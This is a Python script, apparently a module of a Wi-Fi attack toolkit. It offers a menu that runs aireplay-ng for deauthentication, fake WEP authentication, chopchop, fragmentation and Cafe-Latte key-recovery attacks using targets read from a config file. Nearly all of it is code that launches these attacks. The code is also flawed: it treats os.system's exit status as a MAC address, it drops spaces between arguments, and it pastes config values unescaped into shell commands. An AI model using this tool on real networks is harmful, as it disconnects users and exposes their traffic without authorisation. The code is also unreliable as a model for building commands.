import sys
import os
import configparser

def injectionMenu():
	print("1. Perform a Deauthentication Attack")
	print("2. Fake a WEP Authentication")
	print("3. Attempt Chopchop attack (WEP)")
	print("4. Attempt Fragmentation attack (WEP)")
	print("5. Obtain WEP key via Cafe-Latte attack")

def injectionInput(config):
	injectionMenu()
	command = input("> ")
	
	#Issue a deauthentication attack
	if command == "1":
		deauth(config)
	elif command == "2":
		fake_auth(config)
	elif command == "3":
		chopchop(config)
	elif command == "4":
		fragment(config)
	elif command == "5":
		cafelatte(config)
	#Return to the main menu
	else:
		return

def deauth(config):
	#Aireplay command to send deauth packets
	bssid = config['ap']['bssid']
	target_mac = config['target']['mac']
	nic = config['host']['nic']
	cmd = "sudo aireplay-ng -0 1 -a " + bssid + " -c " + target_mac + " " + nic
	os.system(cmd)

def fake_auth(config):
	#Aireplay command to send a fake auth
	nic = config['host']['nic']
	local_mac = os.system("ethtool -P " + nic + " | awk '{ print $NF };'")
	bssid = config['ap']['bssid']
	ssid = config['ap']['ssid']
	cmd = "sudo aireplay-ng -1 6000 -o 1 -q 10 -e" + ssid + " -a " + bssid + " -h " + local_mac + " " + nic
	os.system(cmd)

def chopchop(config):
	#Aireplay command to attempt a chopchop attack
	nic = config['host']['nic']
	local_mac = os.system("ethtool -P " + nic + " | awk '{ print $NF };'")
	bssid = config['ap']['bssid']
	cmd = "sudo aireplay-ng -4 -b " + bssid + " -h " + local_mac + " " + nic
	os.system(cmd)

def fragment(config):
	#Aireplay command to attempt a fragmentation attack
	nic = config['host']['nic']
	local_mac = os.system("ethtool -P " + nic + " | awk '{ print $NF };'")
	bssid = config['ap']['bssid']
	cmd = "sudo aireplay-ng -5 -b " + bssid + " -h " + local_mac + " " + nic
	os.system(cmd)

def cafelatte(config):
	#Aireplay command to perform a cafe latte attack
	nic = config['host']['nic']
	local_mac = os.system("ethtool -P " + nic + " | awk '{ print $NF };'")
	bssid = config['ap']['bssid']
	cmd = "sudo aireplay-ng -6 -b " + bssid + " -h " + local_mac + "-D " + nic
	os.system(cmd)
